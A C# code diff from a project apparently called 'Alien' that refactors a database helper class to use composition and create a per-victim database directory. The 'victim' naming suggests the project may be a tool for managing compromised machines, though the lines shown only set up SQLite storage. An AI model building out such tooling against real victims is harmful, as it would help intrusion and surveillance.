@@ -6,8 +6,10 @@ using System.Threading.Tasks;
 
 namespace Alien
 {
-    internal class clsfnDb : clsWeb
+    internal class clsfnDb
     {
+        private clsWeb m_web { get; set; }
+
         public string m_szConnString { get; set; }
         private clsSqlite m_sqlConn { get; set; }
 
@@ -18,7 +20,8 @@ namespace Alien
         private Dictionary<string, string[]> m_dicTable = new Dictionary<string, string[]>()
         {
             {
-                "Database", new string[]
+                "Database",
+                new string[]
                 {
                     "DbType",
                     "ConnString",
@@ -27,7 +30,8 @@ namespace Alien
                 }
             },
             {
-                "Logs", new string[]
+                "Logs",
+                new string[]
                 {
                     "MsgType",
                     "Message",
@@ -36,10 +40,14 @@ namespace Alien
             }
         };
 
-        public clsfnDb(clsVictim victim, string szDbFileName) : base(victim)
+        public clsfnDb(clsWeb web, string szDbFileName)
         {
+            m_web = web;
             m_szDbFileName = szDbFileName;
-            m_szDbDirectory = Path.Combine(m_victim.m_szPortfolio, "Database");
+
+            m_szDbDirectory = Path.Combine(web.m_victim.m_szPortfolio, "Database");
+            if (!Directory.Exists(m_szDbDirectory))
+                Directory.CreateDirectory(m_szDbDirectory);
 
             m_sqlConn = new clsSqlite(m_szDbFilePath, m_dicTable);
         }
